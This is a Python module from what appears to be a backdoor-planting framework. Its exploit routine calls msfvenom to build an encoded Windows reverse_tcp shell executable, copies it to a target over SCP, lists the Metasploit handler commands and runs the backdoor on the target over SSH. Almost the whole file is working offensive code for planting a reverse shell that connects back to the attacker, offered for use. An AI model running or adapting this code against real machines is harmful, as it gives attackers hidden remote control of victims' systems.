from backdoors.backdoor import *
import os


class Windows(Backdoor):
    prompt = Fore.RED + "(windows) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Windows module..."
        self.core = core
        self.options = {
            "port": Option("port", 53932, "port to connect to", True),
            "name": Option("name", "back.exe", "name of new backdoor", True),
        }
        self.allow_modules = True
        self.modules = {}
        self.help_text = INFO + " Creates and starts a metasploit reverse_tcp backdoor."

    def get_command(self):
        return self.get_value("name")

    def do_exploit(self, args):
        os.system("msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=" + self.core.localIP + " LPORT=" + str(self.get_value("port")) + " -b \"\\x00\" -e x86/shikata_ga_nai -f exe -o " + self.get_value("name"))
        print(GOOD + "Making the backdoor.")
        self.core.curtarget.scpFiles(self, self.get_value("name"), False)
        print(GOOD + "Moving the backdoor.")
        print("Please enter the following commands: ")
        print("msfconsole")
        print("use exploit/multi/handler")
        print("set payload windows/shell/reverse_tcp")
        print("set LPORT " + str(self.get_value("port")))
        print("set LHOST " + str(self.core.localIP))
        input("exploit")
        self.core.curtarget.ssh.exec_command(str(self.get_command))
        for mod in self.modules.keys():
                print(INFO + "Attempting to execute " + mod.name + " module...")
                mod.exploit()
